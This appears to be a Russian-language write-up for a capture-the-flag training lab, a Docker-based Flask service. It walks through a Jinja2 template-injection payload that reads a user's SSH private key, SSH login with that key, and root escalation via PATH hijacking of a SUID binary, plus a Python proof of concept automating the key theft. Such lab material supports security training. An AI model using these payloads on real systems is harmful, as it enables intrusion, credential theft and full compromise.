---
difficulty:
  - Средний
office:
  - Универсальный / Маркетинг
segment:
  - Универсальный
tags: SSTI, LPE, PATH Hijacking, Jinja2, Flask
interface: eth0 (Docker bridge network)
vulns: SSTI, LPE
os: Debian 11 (python:3.8-slim)
hostname: verdict.city.stf
git: https://github.com/...
---
> [!info] Information (не заполнять вручную, парсится само)
> Hostname: **`= this.file.frontmatter.hostname`**
> Difficulty: **`= this.file.frontmatter.difficulty`**
> Office: **`= this.file.frontmatter.office`**
> Segment: **`= this.file.frontmatter.segment`**
> Git: **`= this.file.frontmatter.git`**
> Tags: **`= this.file.frontmatter.tags`**
> Interface: **`= this.file.frontmatter.interface`**
> OS: **`= this.file.frontmatter.os`**

> [!error] Критическое событие
> Ключевой разработчик сервиса уволился месяц назад в не самых дружеских отношениях с компанией. Его код никто не ревьюил, документации нет, а сервис до сих пор работает на продакшене, потому что к нему привязаны важные отчёты.

> [!question] Задача:
Провести чёрный ящик (или серый) тест на проникновение, найти уязвимости компании «ТехноЛогика».

> [!info] Легенда
> Вы — пентестер в компании «ТехноЛогика», крупном разработчике CRM-систем для бизнеса. Вас пригласили провести аудит внутреннего сервиса, который долгое время использовала команда маркетинга.

<div style="page-break-after: always;"></div>

# Донастройка хоста

_Сервис поставляется в виде Docker-образа. Флаги генерируются автоматически при каждом старте контейнера._

## Сборка и запуск

```bash
docker build -t verdict .
docker run -d -p 5001:5001 -p 2222:22 --hostname verdict.city.stf --name verdict verdict
```

## Смена FQDN (при развёртывании на VM)

```bash
hostnamectl set-hostname verdict.city.stf
```

<div style="page-break-after: always;"></div>

# Уязвимый стенд

_Проверка статуса сервисов:_

```bash
# Flask-приложение
ps aux | grep app.py

# SSH
service ssh status
```

✅ Уязвимую машину можно **перезапускать**
✅ Последний снапшот должен быть **с памятью**
❌ Сервису нужен доступ **в Интернет**

## Смена флагов

_Флаги генерируются автоматически при запуске через `entrypoint.sh`. Для ручной смены:_

```bash
USER_SUFFIX=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
ROOT_SUFFIX=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
echo "CTF{user_$USER_SUFFIX}" > /home/user/user.txt
echo "CTF{root_$ROOT_SUFFIX}" > /root/root.txt
chown user:user /home/user/user.txt
chmod 644 /home/user/user.txt
chmod 600 /root/root.txt
```

# Работающие процессы и сервисы

| Service           | Address      | Description                        |
| ----------------- | ------------ | ---------------------------------- |
| python3 (Flask)   | 0.0.0.0:5001 | Веб-приложение VerdictAI           |
| sshd              | 0.0.0.0:22   | SSH-сервер (проброс на хост: 2222) |

Сеть настроена через **Docker**

<div style="page-break-after: always;"></div>

# Доступы

| #    | Login  | Pass                                                                    |
| ---- | ------ | ----------------------------------------------------------------------- |
| SSH  | `user` | SSH-ключ без пароля (извлекается через SSTI из `/home/user/.ssh/id_rsa`) |
| root | `root` | Нет прямого доступа (LPE через `service_check`)                         |

# Пароли для брута

НЕТ — парольная аутентификация SSH отключена, используется только ключевая.

# Writeup

_Вектор атаки: SSTI (Jinja2 RCE) → SSH → LPE (PATH Hijacking via SUID binary)_

## Шаг 1 — Сбор информации

Сканируем цель:

```bash
nmap -sV -p- <TARGET_IP>
```

Обнаруживаем открытые порты:

```
22/tcp   open  ssh   OpenSSH 7.9
5001/tcp open  http  Werkzeug/0.16.1 Python/3.8
```

## Шаг 2 — Исследование веб-приложения

Переходим на `http://<TARGET_IP>:5001`. Находим эндпоинт `/main` с GET-параметрами `verdict` и `id`:

```
http://<TARGET_IP>:5001/main?verdict=spare&id=001
```

На странице `/help` обнаруживаем ссылку на advisory [GHSA-4r7v-whpg-8rx3](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3) — намёк на SSTI в Jinja2.

## Шаг 3 — Эксплуатация SSTI (User Flag)

Проверяем SSTI простым выражением:

```
http://<TARGET_IP>:5001/main?verdict=spare&id={{7*7}}
```

Страница возвращает `49` — шаблон исполняется. Извлекаем приватный SSH-ключ:

```
http://<TARGET_IP>:5001/main?verdict=spare&id={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/home/user/.ssh/id_rsa%27).read()%20}}
```

Копируем ключ в файл и подключаемся:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@<TARGET_IP> -p 2222
cat /home/user/user.txt
# CTF{user_XXXXXXXXXXXX}
```

## Шаг 4 — Повышение привилегий (LPE via PATH Hijacking)

Ищем SUID-бинарники:

```bash
find / -perm -4000 2>/dev/null
# /usr/local/bin/service_check
```

Анализируем строки бинарника:

```bash
strings /usr/local/bin/service_check
# Executing command: id
```

Программа вызывает `id` без абсолютного пути — уязвима к подмене PATH. Эксплуатируем:

```bash
cd /tmp
echo -e '#!/bin/sh\n/bin/bash -p' > id
chmod +x id
export PATH=/tmp:$PATH
service_check
# whoami → root
```

## Шаг 5 — Реализация критического события

```bash
cat /root/root.txt
# CTF{root_XXXXXXXXXXXX}
```

POC (автоматизация шага SSTI):

```python
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001"
payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/user/.ssh/id_rsa').read() }}"
r = requests.get(f"{TARGET}/main", params={"verdict": "spare", "id": payload})

start = r.text.find("-----BEGIN")
end   = r.text.find("-----END RSA PRIVATE KEY-----") + len("-----END RSA PRIVATE KEY-----")
if start != -1:
    print(r.text[start:end])
else:
    print("[-] Key not found")
```
